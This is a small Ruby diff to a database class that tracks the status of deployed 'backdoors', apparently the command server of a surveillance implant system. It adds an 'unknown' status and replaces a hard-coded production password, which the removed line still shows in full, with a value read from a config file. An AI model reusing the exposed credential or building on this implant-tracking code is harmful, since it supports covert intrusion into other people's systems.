@@ -26,6 +26,7 @@ class DB
   CLOSED_BACKDOOR = 2
   QUEUED_BACKDOOR = 3
   NO_SUCH_BACKDOOR = 4
+  UNKNOWN_BACKDOOR = 5
   
   attr_reader :backdoor_signature
 
@@ -35,7 +36,7 @@ class DB
 
     # database credentials
     @username = "9b7b0492433bd580805ba7685ae41b73RSS" #TODO: use an unique id
-    @password = "hJ44ApRjUrMgd5137WzVCXrkkCBYEG4o"    #TODO: this is the rcs-prod key
+    @password = File.read(Dir.pwd + "/config/" + Config.instance.global['DB_SIGN'])
 
     # status of the db connection
     @available = false
@@ -121,7 +122,7 @@ class DB
   # returns ALWAYS the status of a backdoor
   def status_of(build_id, instance_id, subtype)
     # if the database has gone, reply with a fake response in order for the sync to continue
-    return ACTIVE_BACKDOOR, 0 if not @available
+    return DB::UNKNOWN_BACKDOOR, 0 if not @available
 
     # ask the database the status of the backdoor
     return @db.status_of(build_id, instance_id, subtype)
